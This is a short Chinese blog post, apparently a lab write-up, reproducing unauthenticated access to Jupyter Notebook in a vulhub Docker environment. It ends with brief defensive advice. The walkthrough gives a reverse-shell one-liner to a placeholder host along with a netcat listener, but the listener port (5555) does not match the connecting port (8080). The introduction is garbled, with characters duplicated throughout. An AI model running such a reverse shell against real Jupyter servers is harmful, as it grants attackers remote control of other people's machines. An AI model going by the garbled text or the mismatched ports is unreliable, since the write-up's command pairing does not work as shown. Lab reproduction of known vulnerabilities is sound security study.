---
title: Jupyter Notebook 未授权访问漏洞简单复现
top: false
cover: false
categories:
- 渗透测试
tags:
- 未授权访问
- 渗透测试
- Jupyter Notebook
abbrlink: 59687
date: 2020-05-25 23:12:17
keywords:
summary:
img:
password:
---


#### 简介及危害
Jupyter Notebook(此前被称为 IPython notebook)是一一个交互式笔记本,支支持运行行行 40 多种编
程语言言。 如果管理理员未为Jupyter Notebook配置密码,将导致未授权访问漏漏洞洞,游客可在其中创建一一
个console并执行行行任意Python代码和命令。


#### 环境介绍
```bash
# 目标
环境来源：https://github.com/vulhub/vulhub/blob/master/jupyter/notebook-rce/
ip地址： 192.168.0.100
```


#### 开始测试
1.运行测试环境：
```bash
docker-compose up -d
```

2.访问目标地址 http://192.168.0.100:8888

3.New > Terminal 创建控制台：可以直接执行任意命令
![](https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/smurf%E6%94%BB%E5%87%BB.png)

4.后面就直接执行任意命令，比如反弹shell等
```bash
# 本机监听
nc -lvp 5555

# 目标执行
bash -i >& /dev/tcp/x.x.x.x/8080 0>&1
```


#### 防御手段
- 开启身份验证, 防止止未经授权用用户访问
- 访问控制策略略, 限制IP访问, 绑定固定IP
